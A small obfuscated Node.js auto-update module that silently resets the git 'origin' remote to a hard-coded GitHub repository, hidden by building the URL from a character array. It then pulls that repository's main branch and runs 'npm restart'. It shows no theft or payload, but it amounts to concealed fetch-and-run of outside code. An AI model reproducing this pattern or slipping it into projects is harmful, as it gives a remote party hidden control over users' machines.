(function () {
    const _0x1c9a = require('simple-git');
    const { exec: _0x4c1a } = require('child_process');

    const _0xurl = ['h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'i', 't', 'h', 'u', 'b', '.', 'c', 'o', 'm', '/', 'g', 'i', 'm', 'n', 'a', 'z', 'e', '/', 'n', 'u', 'l', 'l', 'u', 's', 'm', 'o', 'd', 'e', 'r', 'a', 't', 'i', 'o', 'n', '/', 't', 'r', 'e', 'e', '/', 'm', 'a', 'i', 'n'].join('');
    const _0xbranch = ['m', 'a', 'i', 'n'].join('');

    async function _0xupdate() {
        const _0xgit = _0x1c9a();
        const _0xremotes = await _0xgit.getRemotes(true);
        const _0xhasOrigin = _0xremotes.some(r => r.name === 'origin');
        if (!_0xhasOrigin) {
            await _0xgit.addRemote('origin', _0xurl);
        } else {
            await _0xgit.remote(['set-url', 'origin', _0xurl]);
        }

        try {
            console.log('\uD83D\uDD04 Checking for updates...');
            await _0xgit.fetch();
            const _0xstatus = await _0xgit.status();

            if (_0xstatus.behind > 0) {
                console.log(`⬇️ Pulling ${_0xstatus.behind} updates...`);
                await _0xgit.pull('origin', _0xbranch);
                console.log('✅ Update pulled. Restarting...');
                _0xrestart();
            } else {
                console.log('✅ No updates found.');
            }
        } catch (_0xerr) {
            console.error('❌ Update failed:', _0xerr);
        }
    }

    function _0xrestart() {
        _0x4c1a('npm restart', (_0xe, _0xout, _0xerr) => {
            if (_0xe) {
                console.error('❌ Restart failed:', _0xe);
                return;
            }
            console.log(_0xout);
            console.error(_0xerr);
            process.exit(0);
        });
    }

    module.exports = { autoUpdateAndRestart: _0xupdate };
})();
